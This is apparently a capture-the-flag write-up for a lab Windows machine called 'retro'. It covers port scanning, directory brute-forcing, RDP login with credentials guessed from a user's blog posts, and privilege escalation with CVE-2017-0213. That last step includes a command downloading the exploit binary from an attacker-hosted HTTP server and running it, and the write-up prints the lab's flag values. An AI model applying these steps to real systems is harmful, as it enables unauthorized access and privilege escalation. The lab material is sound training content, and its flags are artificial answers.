I start to enumerate the machine and run an nmap scan to find open ports on the retro machine.
Since it is a windows machine and most likely blocks pings I use the -Pn(no pings) option.

```
nmap -sV -Pn 10.10.220.226
```
We found 2 open ports 80(http) & 3389(RDP). So we know that RDP is enabled on the the machine and that we can use the
browser to access the server.

After that I do directory crawling with gobuster to look for hidden directories that might lead to vulnerabilities.

```
gobuster dir -u http://10.10.220.226 -w=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
I find a directory called 
```
 http://10.10.220.226/retro/
```
and decide to check it out. We found a wordpress log in page when we scroll to the bottom of the page that leads to a wordpress login form.
We also found some interesting blog post from the user Wade one which talks about how his favorite bood Ready Player One was
turned into a movie and doing some research on the book we find out about Parzival. I decided to use these credentials to gain 
initial access through RDP.

Command used:
```
xfreerdp /u:wade /p:parzival /cert:ignore /v:10.10.220.226 /workarea
```
We logged in successfully and found the first flag 

User: 3b99fbdc6d430bfb51c72c651a261927

Privledge Escalation:

For privledge escalation we first checked out the system info and searched for a way to exploit the system.
command used:
```
sysinfo
```
After that I found an exploit and a payload to upload to the server 
CVE #: CVE-2017-0213
The exploit URL: https://github.com/WindowsExploits/Exploits/tree/master/CVE-2017-0213

commands used:
Attacker:
```
python3 -m http.server --bind 10.6.30.236
```
Victim:
```
Invoke-WebRequest -Uri http://10.6.30.236:8000/CVE-2017-0213_x64.exe -Outfile CVE-2017-0213_x64.exe
```
```
.\CVE-2017-0213_x64.exe 
```
This gave an administrators shell and I was able to find the last flag in C:\Users\Administrator\Desktop

root: 7958b565d7bd88d10c6f22d1c4063
